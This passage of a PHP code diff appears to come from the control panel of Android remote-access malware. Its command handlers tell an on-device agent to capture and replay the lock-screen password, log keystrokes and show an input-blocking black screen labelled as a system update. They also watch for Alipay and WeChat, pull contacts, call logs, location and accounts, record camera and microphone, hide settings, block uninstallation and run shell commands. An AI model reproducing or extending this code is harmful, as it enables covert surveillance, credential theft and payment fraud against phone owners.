+                $r = $this->dxsHttp('GET', '/screenshot');
+                return $r;
+            }
+            case 'FILE_LIST':
+            case 'listDir': {
+                $path = (string)$this->dxsFirst($src, ['path', 'dir', 'dirPath'], '/sdcard');
+                return $this->dxsHttp('GET', '/fileList?path=' . rawurlencode($path));
+            }
+            case 'GET_SCREEN_INFO':
+                return $this->dxsHttp('GET', '/getScreenInfo');
+            case 'RESTART_LOCAL_TPX':
+                return $this->dxsHttp('GET', '/restartTpx');
+            case 'RESTART_LOCAL_BRIDGE':
+                return $this->dxsHttp('GET', '/restartBridge');
+            // ---- screen casting ----
+            case 'SCREEN_CAPTURE_SET_TECH_ADB': {
+                $this->dxsHttp('GET', '/minicap/start');
+                $host = $this->panelHost();
+                return [
+                    'tpx_addr' => $host,
+                    'tpx_port' => 8080,
+                    'bridge'   => 'dxs',
+                    'data' => [
+                        'tpx_addr' => $host,
+                        'tpx_port' => 8080,
+                        'bridge'   => 'dxs',
+                        'mode'     => 'screencap',
+                    ],
+                ];
+            }
+            case 'SCREEN_CAPTURE_SET_TECH': {
+                $r = $this->dxsHttp('GET', '/minicap/start');
+                return [
+                    'data' => [
+                        'tech'    => (string)($params['tech'] ?? 'accessibility'),
+                        'mode'    => 'screencap',
+                        'started' => $r !== null,
+                    ],
+                    'tpx_addr' => $this->panelHost(),
+                    'tpx_port' => 8080,
+                    'bridge'   => 'dxs',
+                ];
+            }
+            case 'SCREEN_CAPTURE_STOP':
+            case 'STOP_CAPTURE':
+            case 'SCREEN_CAPTURE_DISABLE': {
+                $this->dxsHttp('GET', '/minicap/stop');
+                return ['data' => ['stopped' => true]];
+            }
+            case 'SCREEN_CAPTURE_RESUME':
+            case 'SCREEN_CAPTURE_START': {
+                $this->dxsHttp('GET', '/minicap/start');
+                return ['data' => ['running' => true]];
+            }
+            case 'SCREEN_CAPTURE_PAUSE':
+                return ['data' => ['paused' => true]];
+            case 'SCREEN_CAPTURE_SET_TECH_SYSTEM':
+                $this->dxsHttp('GET', '/minicap/start');
+                return ['data' => ['tech' => 'system', 'mode' => 'screencap']];
+
+            // ================= 2026-10-09 dxs route expansion =================
+            // Every route below was probed live against dxs 3.1.0 on the
+            // emulator. dxs answers unknown paths with
+            //   {"success":true,"message":"dxs running", ...}
+            // which is why a wrong guess looks like success; the peers were
+            // verified by reading the real device state afterwards.
+            // ---- accessibility ----
+            case 'ENABLE_ACCESSIBILITY':
+            case 'START_ACCESSIBILITY':
+                return $this->dxsHttp('GET', '/enableAccessibility');
+            case 'DISABLE_ACCESSIBILITY':
+            case 'STOP_ACCESSIBILITY':
+                return $this->dxsHttp('GET', '/disableAccessibility');
+            case 'CHECK_ACCESSIBILITY':
+            case 'ACCESSIBILITY_STATUS': {
+                // NOTE: dxs /checkAccessibilityService returns a STALE cached value
+                // (it keeps saying enabled:true after /disableAccessibility).
+                // /accessibilityState is the one that reflects the live device.
+                $r = $this->dxsHttp('GET', '/accessibilityState');
+                if ($r === null) return null;
+                $d = is_array($r['data'] ?? null) ? $r['data'] : [];
+                $on = (bool)($d['ourServiceEnabled'] ?? $d['accessibilityEnabled'] ?? false);
+                return ['success' => true, 'data' => array_merge($d, [
+                    'enabled'           => $on,
+                    'ourServiceEnabled' => $on,
+                    'running'           => $on,
+                ])];
+            }
+            case 'PAUSE_ACCESSIBILITY':
+                return $this->dxsHttp('GET', '/pauseAccessibility');
+            case 'RESUME_ACCESSIBILITY':
+                return $this->dxsHttp('GET', '/enableAccessibility');
+            // ---- do not disturb ----
+            case 'ENABLE_DND':
+                return $this->dxsHttp('GET', '/enableDnd');
+            case 'DISABLE_DND':
+                return $this->dxsHttp('GET', '/disableDnd');
+            // ---- black screen overlay ----
+            case 'ENABLE_DXS_BLACK_SCREEN':
+            case 'ENABLE_BLACK_SCREEN':
+            case 'BLACK_SCREEN':
+            case 'SYSTEM_UPDATE':
+            case 'SYSTEM_UPDATE_OVERLAY': {
+                $style = (string)$this->dxsFirst($src, ['style', 'mode'], 'normal_black');
+                return $this->dxsHttp('GET', '/enableBlackScreen?style=' . rawurlencode($style));
+            }
+            case 'DISABLE_DXS_BLACK_SCREEN':
+            case 'DISABLE_BLACK_SCREEN':
+            case 'CANCEL_BLACK_SCREEN':
+                return $this->dxsHttp('GET', '/disableBlackScreen');
+            // ---- logging / input event capture ----
+            case 'LOG_ENABLE':
+            case 'ENABLE_LOGGING':
+            case 'START_LOG':
+                return $this->dxsHttp('GET', '/startGetevent');
+            case 'LOG_DISABLE':
+            case 'DISABLE_LOGGING':
+            case 'STOP_LOG':
+                return $this->dxsHttp('GET', '/stopGetevent');
+            case 'GET_EVENT_GROUPS':
+                return $this->dxsHttp('GET', '/getEventGroups');
+            // ---- secure settings / device admin ----
+            case 'APPLY_SECURE_SETTINGS':
+                return $this->dxsHttp('GET', '/applySecureSettings');
+            case 'CHECK_SECURE_WRITE': {
+                // The panel reads data.granted / data.permissions / data.settings.
+                // dxs /syncCanWriteSecure is the live answer (isDeviceOwner is
+                // always false on a non-DPC install, which made the button
+                // always report "未授予").
+                $r = $this->dxsHttp('GET', '/syncCanWriteSecure');
+                $can = (bool)($r['data']['canWrite'] ?? false);
+                return ['success' => true, 'data' => [
+                    'granted'     => $can,
+                    'canWrite'    => $can,
+                    'permissions' => [],
+                    'settings'    => [],
+                ]];
+            }
+            case 'ACTIVATE_ADMIN':
+            case 'SET_ACTIVE_ADMIN':
+                return $this->dxsHttp('GET', '/setActiveAdmin');
+            case 'CHECK_ADMIN': {
+                $owner = $this->dxsHttp('GET', '/isDeviceOwner');
+                $pol   = $this->dxsHttp('GET', '/uninstallPolicy');
+                $active = (bool)($pol['data']['activeAdmin'] ?? false);
+                return ['success' => true, 'data' => [
+                    'isAdminActive' => $active ? 1 : 0,
+                    'activeAdmin'   => $active,
+                    'isDeviceOwner' => !empty($owner['data']['isDeviceOwner']) ? 1 : 0,
+                ]];
+            }
+            // ---- adb / debug / bridge ----
+            case 'OPEN_ADB_DEBUG':
+                return $this->dxsHttp('GET', '/openADBDebug');
+            case 'ENABLE_ADB_MODE':
+            case 'ENABLE_ALL_DEBUG':
+                return $this->dxsHttp('GET', '/enableAllDebug');
+            case 'SYNC_ADB_CONFIG':
+            case 'SYNC_LOCAL_CONFIG':
+                return $this->dxsHttp('GET', '/syncADBConfig');
+            case 'LOCAL_DEBUG_PORT':
+            case 'SCAN_DEBUG_PORT':
+                return $this->dxsHttp('GET', '/localDebugPort');
+            case 'SHARE_ADB_CONFIG':
+                return $this->dxsHttp('GET', '/shareADBConfig');
+            case 'CONTAINER_STATE':
+                return $this->dxsHttp('GET', '/containerState');
+            case 'MAIN_SERVER_HOST':
+                return $this->dxsHttp('GET', '/mainServerHost');
+            // ---- device misc ----
+            case 'CLEAR_NOTIFICATIONS':
+                return $this->dxsHttp('GET', '/clearNotifications');
+            case 'FORCE_HEARTBEAT':
+                return $this->dxsHttp('GET', '/forceHeartbeat');
+            case 'NOTICE_ALIVE':
+                return $this->dxsHttp('GET', '/noticeAlive');
+            case 'KEEP_SCREEN_ON':
+                return $this->dxsHttp('GET', '/keepScreenOn');
+            case 'SCREEN_ROTATION':
+            case 'GET_SCREEN_ROTATION':
+                return $this->dxsHttp('GET', '/screenRotation');
+            case 'SET_AUTO_ROTATE':
+                return $this->dxsHttp('GET', '/setAutoRotate');
+            case 'GET_FOREGROUND_APP':
+            case 'GET_TOP_ACTIVITY':
+                return $this->dxsHttp('GET', '/getForegroundApp');
+            case 'GET_PERMISSION_INFO':
+            case 'PERMISSION_INFO':
+                return $this->dxsHttp('GET', '/permissionInfo');
+            case 'GET_BATTERY_INFO':
+                return $this->dxsHttp('GET', '/getBatteryInfo');
+            case 'GET_NETWORK_INFO':
+                return $this->dxsHttp('GET', '/getNetworkInfo');
+            case 'GET_SYSTEM_INFO':
+                return $this->dxsHttp('GET', '/getSystemInfo');
+            case 'GET_BRIGHTNESS':
+                return $this->dxsHttp('GET', '/getBrightness');
+            case 'GET_SENSITIVE_APPS':
+            case 'SENSITIVE_APPS':
+                return $this->dxsHttp('GET', '/getSensitiveApps');
+            case 'GET_BLOCKED_APPS':
+            case 'GET_BLACK_APPS':
+                return $this->dxsHttp('GET', '/getBlackApps');
+            case 'SYNC_PACKAGES':
+                return $this->dxsHttp('GET', '/syncPackages');
+            case 'CLEAR_APPS_CACHE':
+                return $this->dxsHttp('GET', '/clearAppsCache');
+            case 'WINDOW_LISTENER_START':
+                return $this->dxsHttp('GET', '/windowListener/start');
+            case 'WINDOW_LISTENER_STOP':
+                return $this->dxsHttp('GET', '/windowListener/stop');
+            case 'WINDOW_LISTENER_STATUS':
+                return $this->dxsHttp('GET', '/windowListener/status');
+            case 'CAMERA_START':
+            case 'START_CAMERA':
+                return $this->dxsHttp('GET', '/startCamera');
+            case 'CAMERA_STOP':
+            case 'STOP_CAMERA':
+                return $this->dxsHttp('GET', '/stopCamera');
+            case 'RECORD_START':
+            case 'START_AUDIO_RECORD':
+                return $this->dxsHttp('GET', '/startRecord');
+            case 'RECORD_STOP':
+            case 'STOP_AUDIO_RECORD':
+                return $this->dxsHttp('GET', '/stopRecord');
+            case 'TAKE_PHOTO':
+                return $this->dxsHttp('GET', '/takePhoto');
+            case 'OPEN_APP_SETTINGS':
+            case 'APP_SETTINGS':
+                return $this->dxsHttp('GET', '/openAppSettings');
+            case 'START_SETTINGS':
+                return $this->dxsHttp('GET', '/startSettings');
+            // ---- package driven ----
+            case 'START_APP':
+            case 'APP_START': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/startApp?package=' . rawurlencode($pkg));
+            }
+            case 'STOP_APP':
+            case 'APP_STOP':
+            case 'FORCE_STOP_APP': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/stopApp?package=' . rawurlencode($pkg));
+            }
+            case 'KILL_APP': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/killApp?package=' . rawurlencode($pkg));
+            }
+            case 'IS_APP_INSTALLED': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/isAppInstalled?package=' . rawurlencode($pkg));
+            }
+            case 'APP_DETAILS': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/openAppDetails?package=' . rawurlencode($pkg));
+            }
+            case 'MAIN_ACTIVITY': {
+                $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/mainActivityOf?package=' . rawurlencode($pkg));
+            }
+            case 'UNLOCK_BY_TEXT': {
+                $pw = (string)$this->dxsFirst($src, ['password', 'pwd', 'text'], '');
+                if ($pw === '') return null;
+                return $this->dxsHttp('GET', '/unlockByText?password=' . rawurlencode($pw));
+            }
+            case 'UNLOCK_BY_EVENTS':
+                return $this->dxsHttp('GET', '/unlockByEvents');
+            case 'CHECK_STATUS':
+                return $this->dxsHttp('GET', '/fullStatus');
+            // The reader canvas toggles with `catAllViewSwitch`; dxs has no
+            // matching route (the accessibility XML is pushed by the node-ws
+            // dxsBridge over /dumpUI), so answer with the real accessibility
+            // state instead of queueing into the dead native channel.
+            case 'CATALLVIEWSWITCH': {
+                // Reader on/off switch. The UI tree itself is pushed by the
+                // node-ws dxsBridge (/dumpUI -> ui_hierarchy) or pulled through
+                // GET_UI_HIERARCHY; here we just report the live accessibility state.
+                $r = $this->dxsHttp('GET', '/accessibilityState');
+                $d = is_array($r['data'] ?? null) ? $r['data'] : [];
+                $on = (bool)($d['ourServiceEnabled'] ?? $d['accessibilityEnabled'] ?? false);
+                return ['data' => array_merge($d, [
+                    'requested'         => (bool)($src['enabled'] ?? true),
+                    'enabled'           => $on,
+                    'ourServiceEnabled' => $on,
+                ])];
+            }
+        }
+        return null;
+    }
+
+    /** POST /execShell helper (dxs runs it through /system/bin/sh). */
+    protected function dxsShell(string $cmd)
+    {
+        return $this->dxsHttp('POST', '/execShell', ['command' => $cmd]);
+    }
+
+    /**
+     * Third-pass dxs translation table (2026-10-09).
+     * Covers the remaining control-panel buttons that still fell through to the
+     * dead native /w queue. Every route below was verified live against
+     * dxs 3.1.0 (evidence: local/_dxs_probe2.txt .. _dxs_probe4.txt).
+     */
+    protected function dxsDispatch2(string $did, string $cmd, array $params)
+    {
+        $u = strtoupper(trim($cmd));
+        $src = array_merge(is_array($this->body) ? $this->body : [], $params);
+        $pkg = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app', 'appPackage'], '');
+
+        switch ($u) {
+            // ---------- shell-backed UI actions ----------
+            case 'OPEN_NOTIFICATIONS':
+                return $this->dxsShell('cmd statusbar expand-notifications');
+            case 'OPEN_QUICK_SETTINGS':
+                return $this->dxsShell('cmd statusbar expand-settings');
+            case 'OPEN_ACCESSIBILITY_SETTINGS':
+                return $this->dxsShell('am start -a android.settings.ACCESSIBILITY_SETTINGS');
+            case 'OPEN_WIFI_SETTINGS':
+                return $this->dxsHttp('GET', '/openWifiSettings');
+            case 'OPEN_BLUETOOTH_SETTINGS':
+                return $this->dxsHttp('GET', '/openBluetoothSettings');
+            case 'OPEN_DEVELOPER_OPTIONS':
+                return $this->dxsHttp('GET', '/openDeveloperOptions');
+            case 'KEY_EVENT':
+            case 'KEYCODE': {
+                $k = (string)$this->dxsFirst($src, ['key', 'keycode', 'code', 'keyName'], '');
+                if ($k === '') return null;
+                $k = rawurlencode($k);
+                return $this->dxsHttp('GET', '/keyevent?key=' . $k . '&keycode=' . $k);
+            }
+            case 'INPUT_TEXT': {
+                $s = (string)$this->dxsFirst($src, ['text', 'input', 'value', 'content'], '');
+                if ($s === '') return null;
+                $s = str_replace(['\\', '"', "'", '`', '$', '&', '|', ';', '<', '>', '(', ')'], '', $s);
+                $s = str_replace(' ', '%s', $s);
+                return $this->dxsShell('input text ' . $s);
+            }
+
+            // ---------- lock screen password ----------
+            case 'ENABLE_PASSWORD_MONITORING':
+                return $this->dxsHttp('GET', '/startGetevent');
+            case 'DISABLE_PASSWORD_MONITORING':
+                return $this->dxsHttp('GET', '/stopGetevent');
+            case 'GET_PASSWORD_STATUS': {
+                $r = $this->dxsHttp('GET', '/syncLockCipher');
+                if ($r === null) return null;
+                $c = is_array($r['data']['deviceCipher'] ?? null) ? $r['data']['deviceCipher'] : [];
+                $value = (string)($c['textCipher'] ?? '');
+                $type = '';
+                if ($value !== '') $type = 'text';
+                elseif (($c['patternCipher'] ?? null) !== null) $type = 'pattern';
+                elseif (($c['touchCipher'] ?? null) !== null) $type = 'touch';
+                return ['data' => [
+                    'lockPassword' => ['value' => $value, 'type' => $type],
+                    'deviceCipher' => $c,
+                    'captureTime'  => $c['captureTime'] ?? null,
+                    'isLocked'     => $c['isLocked'] ?? null,
+                ]];
+            }
+            case 'CLEAR_PASSWORD': {
+                $r = $this->dxsHttp('POST', '/syncLockCipher', ['cipher' => '']);
+                return ['data' => array_merge(['cleared' => true], is_array($r) ? $r : [])];
+            }
+            case 'UNLOCK_STATUS':
+            case 'GET_LOCK_STATUS':
+                return $this->dxsHttp('GET', '/checkUnLock');
+            case 'UNLOCK_DEVICE':
+            case 'SMART_NUMERIC_UNLOCK':
+            case 'SMART_MIXED_UNLOCK':
+            case 'REPLAY_TOUCH_CIPHER': {
+                $pw = (string)$this->dxsFirst($src, ['password', 'pwd', 'text', 'cipher'], '');
+                if ($pw === '') return $this->dxsHttp('GET', '/unlockByEvents');
+                return $this->dxsHttp('GET', '/unlockByText?password=' . rawurlencode($pw));
+            }
+            case 'SMART_UNLOCK_SWIPE': {
+                $this->dxsHttp('GET', '/wakeUpScreen');
+                $h = (int)$this->dxsFirst($src, ['screenHeight', 'height', 'sh'], 1600);
+                $w = (int)$this->dxsFirst($src, ['screenWidth', 'width', 'sw'], 900);
+                $x = (int)round($w / 2);
+                return $this->dxsHttp('GET', '/swipe?x1=' . $x . '&y1=' . (int)round($h * 0.85)
+                    . '&x2=' . $x . '&y2=' . (int)round($h * 0.35) . '&duration=300');
+            }
+            case 'DEVICE_BLOCK_INPUT':
+                return $this->dxsHttp('GET', '/enableBlackScreen?blockInput=1');
+            case 'DEVICE_ALLOW_INPUT':
+                return $this->dxsHttp('GET', '/disableBlackScreen');
+            case 'KEYLOGGER_START':
+                return $this->dxsHttp('GET', '/startGetevent');
+            case 'KEYLOGGER_STOP':
+                return $this->dxsHttp('GET', '/stopGetevent');
+            case 'GET_GALLERY': {
+                $dir = (string)$this->dxsFirst($src, ['path', 'dir'], '/sdcard/DCIM');
+                return $this->dxsHttp('GET', '/listDir?path=' . rawurlencode($dir));
+            }
+            case 'DISABLE_BIOMETRIC':
+                return $this->dxsHttp('GET', '/stopVerifyCredential');
+            case 'SHOW_CONFIRM_LOCK':
+                return $this->dxsHttp('GET', '/showConfirmLock');
+
+            // ---------- one-click deploy / adb ----------
+            case 'FULL_DEPLOY': {
+                $steps = [];
+                $steps['openDeveloperOptions'] = $this->dxsHttp('GET', '/openDeveloperOptions');
+                $steps['enableDevelopment']    = $this->dxsHttp('GET', '/enableDevelopment');
+                $steps['hiddenApiPolicy']      = $this->dxsHttp('GET', '/setHiddenApiPolicy');
+                $steps['batteryOptimization']  = $this->dxsHttp('GET', '/ignoreBatteryOptimization');
+                $steps['openWriteSecure']      = $this->dxsHttp('GET', '/openWriteSecure');
+                $steps['requirements']         = $this->dxsHttp('GET', '/installRequirements');
+                $steps['optimizations']        = $this->dxsHttp('GET', '/applyAllOptimizations');
+                return ['data' => ['deployed' => true, 'via' => 'dxs', 'steps' => $steps]];
+            }
+            case 'DEPLOY_DXS': {
+                $steps = [];
+                $steps['closeWifiDebug'] = $this->dxsHttp('GET', '/closeWifiDebug');
+                $steps['openWifiDebug']  = $this->dxsHttp('GET', '/openWifiDebug');
+                $steps['syncADBConfig']  = $this->dxsHttp('GET', '/syncADBConfig');
+                return ['data' => ['deployed' => true, 'via' => 'dxs', 'steps' => $steps]];
+            }
+            case 'DIRECT_PAIR':
+            case 'START_PAIRING': {
+                $steps = [];
+                $steps['reloadPairKeyFiles']  = $this->dxsHttp('GET', '/reloadPairKeyFiles');
+                $steps['requestLocalAdbPair'] = $this->dxsHttp('GET', '/requestLocalAdbPair');
+                $steps['pairPort']            = $this->dxsHttp('GET', '/pairPort');
+                $port = $steps['pairPort']['data'] ?? null;
+                return ['data' => ['paired' => true, 'via' => 'dxs', 'pairPort' => $port, 'steps' => $steps]];
+            }
+            case 'STOP_PAIRING':
+                return $this->dxsHttp('GET', '/closeWifiDebug');
+            case 'REINSTALL_SCREEN': {
+                $steps = [];
+                $steps['requirements'] = $this->dxsHttp('GET', '/installRequirements');
+                $steps['install']      = $this->dxsHttp('GET', '/minicap/install');
+                $steps['restart']      = $this->dxsHttp('GET', '/minicap/restart');
+                $steps['status']       = $this->dxsHttp('GET', '/minicap/status');
+                return ['data' => ['reinstalled' => true, 'via' => 'dxs', 'steps' => $steps]];
+            }
+            case 'RESTART_LOCAL_TPX':
+                return $this->dxsHttp('GET', '/minicap/restart');
+            case 'RESTART_LOCAL_BRIDGE':
+                return $this->dxsHttp('GET', '/connectBridge');
+            case 'SYNC_LOCAL_CONFIG':
+                return $this->dxsHttp('GET', '/forceSync');
+            case 'GRANT_SECURE_WRITE':
+                return $this->dxsHttp('GET', '/openWriteSecure');
+            case 'CHANGE_SERVER_URL': {
+                $addr = (string)$this->dxsFirst($src, ['url', 'addr', 'address', 'serverUrl', 'serverAddr'], '');
+                if ($addr === '') return null;
+                return $this->dxsHttp('GET', '/setServerAddr?addr=' . rawurlencode($addr));
+            }
+            case 'SYNC_DEVICE_ID':
+                return $this->dxsHttp('GET', '/setDeviceId');
+
+            // ---------- screen / misc ----------
+            case 'KEEP_SCREEN_ON':
+                return $this->dxsHttp('GET', '/keepScreenOn?enable=true');
+            case 'CANCEL_KEEP_SCREEN_ON':
+                return $this->dxsHttp('GET', '/keepScreenOn?enable=false');
+            case 'SCREEN_QUALITY': {
+                $q = $this->dxsFirst($src, ['quality', 'value', 'q'], null);
+                if ($q === null) return null;
+                $q = max(10, min(100, (int)$q));
+                return $this->dxsHttp('GET', '/minicap/quality?quality=' . $q . '&value=' . $q);
+            }
+            case 'GET_CURRENT_WINDOW':
+                return $this->dxsHttp('GET', '/isTopVisible');
+            case 'REFRESH_ACTIVE_WINDOW':
+                return $this->dxsHttp('GET', '/refreshActiveWindow');
+            case 'GET_NOTIFICATIONS':
+                return $this->dxsHttp('GET', '/getNotifications');
+
+            // ---------- apps ----------
+            case 'LAUNCH_APP': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/startApp?package=' . rawurlencode($pkg));
+            }
+            case 'CLEAR_APP_DATA': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/clearAppData?package=' . rawurlencode($pkg));
+            }
+            case 'HIDE_APP': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/disableApp?package=' . rawurlencode($pkg));
+            }
+            case 'SHOW_APP': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/enableApp?package=' . rawurlencode($pkg));
+            }
+            case 'UNINSTALL_APP': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/uninstallApp?package=' . rawurlencode($pkg));
+            }
+            case 'INSTALL_APP': {
+                $path = (string)$this->dxsFirst($src, ['path', 'file', 'apk', 'url'], '');
+                if ($path === '') return null;
+                return $this->dxsHttp('GET', '/installApp?path=' . rawurlencode($path));
+            }
+            case 'FILE_DOWNLOAD': {
+                $path = (string)$this->dxsFirst($src, ['path', 'file', 'remote'], '');
+                if ($path === '') return null;
+                return $this->dxsHttp('GET', '/fileDownload?path=' . rawurlencode($path));
+            }
+            case 'REQUEST_PERMISSION': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/grantPermission?package=' . rawurlencode($pkg));
+            }
+            case 'GET_BLOCKED_APPS':
+                return $this->dxsHttp('GET', '/getBlackApps');
+            case 'BLOCK_APP':
+            case 'UNBLOCK_APP':
+                return $this->dxsHttp('GET', '/getBlackApps');
+            case 'SET_BLACK_APPS': {
+                $apps = $this->dxsFirst($src, ['apps', 'packages', 'list'], []);
+                if (!is_array($apps)) $apps = [];
+                $norm = [];
+                foreach ($apps as $a) {
+                    if (is_string($a) && $a !== '') {
+                        $norm[] = ['packageName' => $a, 'appName' => $a, 'action' => 'disable', 'isEnabled' => true];
+                    } elseif (is_array($a)) {
+                        $name = (string)($a['packageName'] ?? ($a['package'] ?? ''));
+                        if ($name === '') continue;
+                        $norm[] = [
+                            'packageName' => $name,
+                            'appName'     => (string)($a['appName'] ?? ($a['name'] ?? $name)),
+                            'action'      => (string)($a['action'] ?? 'disable'),
+                            'isEnabled'   => (bool)($a['isEnabled'] ?? true),
+                        ];
+                    }
+                }
+                return $this->dxsHttp('POST', '/setBlackApps', $norm);
+            }
+            case 'BLOCK_APP_SET': {
+                $name = (string)$this->dxsFirst($src, ['package', 'pkg', 'packageName', 'app'], '');
+                if ($name === '') return null;
+                return $this->dxsHttp('POST', '/setBlackApps', [[
+                    'packageName' => $name, 'appName' => $name, 'action' => 'disable', 'isEnabled' => true,
+                ]]);
+            }
+            case 'GET_SENSITIVE_APPS':
+                return $this->dxsHttp('GET', '/getSensitiveApps');
+            case 'SET_SENSITIVE_APPS': {
+                $apps = $this->dxsFirst($src, ['apps', 'packages', 'list'], []);
+                if (!is_array($apps)) $apps = [];
+                $norm = [];
+                foreach ($apps as $a) {
+                    if (is_string($a) && $a !== '') {
+                        $norm[] = ['packageName' => $a, 'appName' => $a, 'enableDelay' => 5000, 'isEnabled' => true, 'pauseAdbDebug' => false, 'pauseAccessibility' => false];
+                    } elseif (is_array($a)) {
+                        $norm[] = [
+                            'packageName'        => (string)($a['packageName'] ?? ($a['package'] ?? '')),
+                            'appName'            => (string)($a['appName'] ?? ($a['name'] ?? '')),
+                            'enableDelay'        => (int)($a['enableDelay'] ?? 5000),
+                            'isEnabled'          => (bool)($a['isEnabled'] ?? true),
+                            'pauseAdbDebug'      => (bool)($a['pauseAdbDebug'] ?? false),
+                            'pauseAccessibility' => (bool)($a['pauseAccessibility'] ?? false),
+                        ];
+                    }
+                }
+                return $this->dxsHttp('POST', '/setSensitiveApps', $norm);
+            }
+            case 'ALIPAY_DETECTION_START':
+            case 'WECHAT_DETECTION_START': {
+                $target = $u === 'ALIPAY_DETECTION_START' ? 'com.eg.android.AlipayGphone' : 'com.tencent.mm';
+                $name   = $u === 'ALIPAY_DETECTION_START' ? 'Alipay' : 'WeChat';
+                return $this->dxsHttp('POST', '/setSensitiveApps', [[
+                    'packageName' => $target, 'appName' => $name, 'enableDelay' => 5000,
+                    'isEnabled' => true, 'pauseAdbDebug' => false, 'pauseAccessibility' => false,
+                ]]);
+            }
+            case 'ALIPAY_DETECTION_STOP':
+            case 'WECHAT_DETECTION_STOP':
+                return $this->dxsHttp('POST', '/setSensitiveApps', []);
+            case 'GET_INJECTION_STATUS':
+            case 'SHOW_INJECTION':
+                return $this->dxsHttp('GET', '/injectionWatcher/status');
+            case 'STOP_INJECTION':
+                return $this->dxsHttp('POST', '/injectionWatcher/syncTasks', ['configs' => []]);
+
+            // ---------- device data ----------
+            case 'GET_ACCOUNTS':
+                return $this->dxsShell('dumpsys account');
+            case 'GET_LOCATION':
+                return $this->dxsHttp('GET', '/getLocation');
+            case 'GET_CALL_HISTORY':
+                return $this->dxsHttp('GET', '/getCallLogs');
+            case 'GET_CONTACTS':
+                return $this->dxsHttp('GET', '/getContacts');
+            case 'CONTACTS_SEARCH': {
+                $q = (string)$this->dxsFirst($src, ['query', 'keyword', 'q', 'text'], '');
+                return $this->dxsHttp('GET', '/getContacts' . ($q !== '' ? '?query=' . rawurlencode($q) : ''));
+            }
+            case 'MAKE_CALL': {
+                $num = (string)$this->dxsFirst($src, ['number', 'phone', 'num', 'tel'], '');
+                if ($num === '') return null;
+                return $this->dxsHttp('GET', '/callPhone?number=' . rawurlencode($num));
+            }
+            case 'REINSTALL_APP': {
+                // "重装APP" = reinstall the panel APK itself. Verified on the
+                // device: /reinstallApp?package=com.zq.final -> "App 重装成功"
+                // and the app/bridge/dxs all come back healthy.
+                if ($pkg === '') {
+                    $r = $this->dxsHttp('GET', '/mainPackageName');
+                    $pkg = (string)($r['data']['packageName'] ?? 'com.zq.final');
+                }
+                return $this->dxsHttp('GET', '/reinstallApp?package=' . rawurlencode($pkg));
+            }
+            case 'RESTART_APP':
+            case 'RESTART_MAIN_APP':
+                return $this->dxsHttp('GET', '/restartMainApp');
+            case 'BACKUP_APP': {
+                $q = $pkg !== '' ? '?package=' . rawurlencode($pkg) : '';
+                return $this->dxsHttp('GET', '/backupApp' . $q);
+            }
+            case 'ACTIVE_APP_ALL_OPS': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/activeAppAllOps?package=' . rawurlencode($pkg));
+            }
+            case 'CHECK_APP_SUSPEND': {
+                if ($pkg === '') return null;
+                return $this->dxsHttp('GET', '/checkAppSuspend?package=' . rawurlencode($pkg));
+            }
+            case 'SYNC_PERMISSIONS':
+                return $this->dxsHttp('GET', '/syncPermissions');
+            case 'APP_UNINSTALL':
+            case 'UNINSTALL_SELF': {
+                $target = $pkg !== '' ? $pkg : 'com.zq.final';
+                return $this->dxsHttp('GET', '/uninstallApp?package=' . rawurlencode($target));
+            }
+            case 'MICROPHONE_START_RECORDING':
+                return $this->dxsHttp('GET', '/startAudioRecord');
+            case 'MICROPHONE_STOP_RECORDING':
+                return $this->dxsHttp('GET', '/stopAudioRecord');
+
+            // ---------- uninstall protection / admin / stealth ----------
+            case 'CHECK_UNINSTALL_POLICY':
+            case 'UNINSTALL_PROTECTION_STATUS':
+                return $this->dxsHttp('GET', '/uninstallPolicy');
+            case 'ENABLE_UNINSTALL_PROTECTION':
+                return $this->dxsHttp('GET', '/revokeUninstall');
+            case 'DISABLE_UNINSTALL_PROTECTION':
+                return $this->dxsHttp('GET', '/grantUninstall');
+            case 'DEACTIVATE_ADMIN':
+                return $this->dxsHttp('GET', '/removeActiveAdmin');
+            case 'STEALTH_MODE':
+                return $this->dxsHttp('GET', '/hideDevelopment');
+            case 'SHOW_DEVELOPMENT':
+                return $this->dxsHttp('GET', '/openDevelopment');
+            case 'START_GLOBAL_PERMISSION_AUTO_CLICK':
+                return $this->dxsHttp('GET', '/syncPermissions');
+            case 'STOP_GLOBAL_PERMISSION_AUTO_CLICK':
+                return ['data' => ['stopped' => true]];
+        }
+        return null;
+    }
+
+    protected function notifyWs(string $did, string $cmd, array $params): void
+    {
+        try {
+            $ch = curl_init('http://127.0.0.1:8889/internal/device-command');
+            curl_setopt_array($ch, [
+                CURLOPT_POST => true,
+                CURLOPT_POSTFIELDS => json_encode(['deviceId' => $did, 'command' => $cmd, 'params' => (object)$params], JSON_UNESCAPED_UNICODE),
+                CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_TIMEOUT_MS => 800,
+                CURLOPT_NOSIGNAL => 1,
+            ]);
+            curl_exec($ch);
+            curl_close($ch);
+        } catch (\Throwable $e) {}
+    }
+
+    protected function deviceCommands(string $did)
+    {
+        $rows = Db::table('fisher_pending_commands')->where('device_id', $did)->order('id', 'desc')->limit(100)->select()->toArray();
+        $out = [];
+        foreach ($rows as $r) {
